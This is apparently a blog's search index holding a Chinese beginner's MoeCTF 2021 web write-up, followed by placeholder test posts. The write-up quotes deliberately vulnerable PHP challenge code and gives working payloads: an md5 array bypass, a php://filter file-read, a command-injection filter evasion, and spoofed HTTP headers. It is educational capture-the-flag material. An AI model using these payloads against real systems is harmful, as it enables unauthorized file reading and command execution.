<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MoeCTF</title>
    <link href="/2021/09/26/moectf/"/>
    <url>/2021/09/26/moectf/</url>
    
    <content type="html"><![CDATA[<h1 id="Moectf-Write-Up"><a href="#Moectf-Write-Up" class="headerlink" title="Moectf Write Up"></a>Moectf Write Up</h1><h4 id="人生第一篇wp，如有错误请不吝指出"><a href="#人生第一篇wp，如有错误请不吝指出" class="headerlink" title="人生第一篇wp，如有错误请不吝指出"></a>人生第一篇wp，如有错误请不吝指出</h4><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h6 id="1-Web安全入门指北—GET"><a href="#1-Web安全入门指北—GET" class="headerlink" title="1.Web安全入门指北—GET"></a>1.Web安全入门指北—GET</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payload:<span class="hljs-attribute">moe</span>=flag<br></code></pre></td></tr></table></figure><h6 id="2-Web安全入门指北—POST"><a href="#2-Web安全入门指北—POST" class="headerlink" title="2.Web安全入门指北—POST"></a>2.Web安全入门指北—POST</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.利用hackbar传入post参数<span class="hljs-attribute">moe</span>=flag<br>2.利用bp(burpsuite)抓包更改post参数为<span class="hljs-attribute">moe</span>=flag<br>3.利用python requests库写脚本<br></code></pre></td></tr></table></figure><h6 id="3-Web安全入门指北—小饼干"><a href="#3-Web安全入门指北—小饼干" class="headerlink" title="3.Web安全入门指北—小饼干"></a>3.Web安全入门指北—小饼干</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.利用bp抓包将cookie中的vip设为<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h6 id="4-2048"><a href="#4-2048" class="headerlink" title="4.2048"></a>4.2048</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">起初思路:<br><span class="hljs-number">1.</span>查看网页js代码可知分数由score参数控制，故想在<span class="hljs-built_in">console</span>更改score初始值，提交到网页后端。未遂<br>正确解法:<br><span class="hljs-number">2.</span>仔细审查源代码发现<br><span class="hljs-attr">getFlag</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest;<br>req.open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;flag.php?score=&quot;</span>+obj.score,<span class="hljs-literal">true</span>);<br>req.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>alert(<span class="hljs-built_in">this</span>.responseText);<br>&#125;<br>req.send();<br>&#125;<br>&#125;<br>故只需构造payload:?score=<span class="hljs-number">500000</span>即可<br></code></pre></td></tr></table></figure><h6 id="5-Web-Inc"><a href="#5-Web-Inc" class="headerlink" title="5.Web_Inc"></a>5.Web_Inc</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>!=<span class="hljs-variable">$b</span>&amp;&amp;md5(<span class="hljs-variable">$a</span>)===md5(<span class="hljs-variable">$b</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;try again&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span>考察知识<br><span class="hljs-built_in">get</span>/<span class="hljs-built_in">post</span> md5绕过<br><span class="hljs-number">2.</span>解决方法<br>===会比较类型，可以用到PHP中md5()函数无法处理数组（会返回<span class="hljs-literal">NULL</span>）来实现绕过。<br>构造payload:<br><span class="hljs-keyword">a</span>[]=<span class="hljs-number">1</span> b[]=<span class="hljs-number">2</span>即可<br></code></pre></td></tr></table></figure><h6 id="6-ezinclude"><a href="#6-ezinclude" class="headerlink" title="6.ezinclude"></a>6.ezinclude</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码：<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>php远程文件包含漏洞 base64加解密<br><span class="hljs-number">2</span>.解决方法<br>构造payload:file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br>详情请参考博客:https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/lilongsy/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">108146107</span><br>base64加解密百度在线网站即可<br></code></pre></td></tr></table></figure><h6 id="7-babeRCE"><a href="#7-babeRCE" class="headerlink" title="7.babeRCE"></a>7.babeRCE</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">题目源码:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;rce&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="hljs-variable">$rce</span>)) &#123;<br>        system(<span class="hljs-variable">$rce</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hhhhhhacker!!!&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>命令执行漏洞绕过<br><span class="hljs-number">2</span>.解决方法<br>构造payload:rce=whoami可知直接通过过滤执行cat flag即可<br>百度常见绕过方式，可得<br>构造payload:rce=ca\t<span class="hljs-variable">$&#123;IFS&#125;</span>fla\g.php即可<br>详情请参考博客:https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/SpouseLJ/</span>p/<span class="hljs-number">13223967</span>.html<br><br></code></pre></td></tr></table></figure><h6 id="8-Do-you-know-HTTP"><a href="#8-Do-you-know-HTTP" class="headerlink" title="8.Do you know HTTP?"></a>8.Do you know HTTP?</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>.考察知识<br>http header<br><span class="hljs-number">2</span>.解决方法<br>网页发现给出三个提示<br><span class="hljs-number">1</span>)用<span class="hljs-string">&#x27;HS&#x27;</span>来请求试试？<br><span class="hljs-number">2</span>)只有本地ip地址才可以哦！<br><span class="hljs-number">3</span>)<span class="hljs-string">&#x27;LT&#x27;</span>才是本题官方浏览器哦！<br>利用bp抓包按需更改请求包为<br>HS <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>        Host: <span class="hljs-number">47.93</span>.<span class="hljs-number">215.154</span>:<span class="hljs-number">5002</span><br>        Cache-Control: max-age=<span class="hljs-number">0</span><br>        Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>        User-Agent: LT<br>        Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>avif,image<span class="hljs-regexp">/webp,image/</span>apng,*<span class="hljs-regexp">/*;q=0.8,application/</span>signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>        Accept-Encoding: gzip, deflate<br>        Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>        Connection: close<br>        X-Forwarded-For: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>        Referer: www.ltyyds.com<br>        即可<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>欢迎大家给我留言</title>
    <link href="/2021/09/25/Welcome/"/>
    <url>/2021/09/25/Welcome/</url>
    
    <content type="html"><![CDATA[<h5 id="欢迎大家给我留言"><a href="#欢迎大家给我留言" class="headerlink" title="欢迎大家给我留言"></a>欢迎大家给我留言</h5>]]></content>
    
    
    
    <tags>
      
      <tag>个人生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/09/25/passage5/"/>
    <url>/2021/09/25/passage5/</url>
    
    <content type="html"><![CDATA[<p>第三篇测试文章，我好难…</p>]]></content>
    
    
    
    <tags>
      
      <tag>tags测试2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/passage4/"/>
    <url>/2021/06/10/passage4/</url>
    
    <content type="html"><![CDATA[<p>我是火星人吗？？？</p>]]></content>
    
    
    
    <tags>
      
      <tag>tags测试1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2021/06/10/passage6/"/>
    <url>/2021/06/10/passage6/</url>
    
    <content type="html"><![CDATA[<p>第四篇测试文章，我好难…</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
